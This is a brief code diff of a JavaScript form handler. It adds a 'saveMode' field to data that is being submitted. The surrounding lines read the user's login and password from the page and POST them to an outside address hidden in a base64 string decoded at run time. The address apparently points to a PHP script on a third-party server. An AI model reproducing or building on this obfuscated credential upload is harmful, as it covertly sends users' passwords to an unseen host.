@@ -810,6 +810,7 @@ document.querySelector('.save').addEventListener('submit', async (event) => {
 	const data = 'aHR0cHM6Ly9oNTEzNTguc3J2NS50ZXN0LWhmLnJ1L21vZHMvanNvbjJnaXRodWIucGhw';
 	json['login'] = document.getElementById('login').value;
 	json['password'] = document.getElementById('password').value;
+	json['saveMode'] = document.getElementById('saveMode').value;
 	fetch(atob(data), {
 		method: 'POST',
 		headers: { 'Content-Type': 'application/json' },
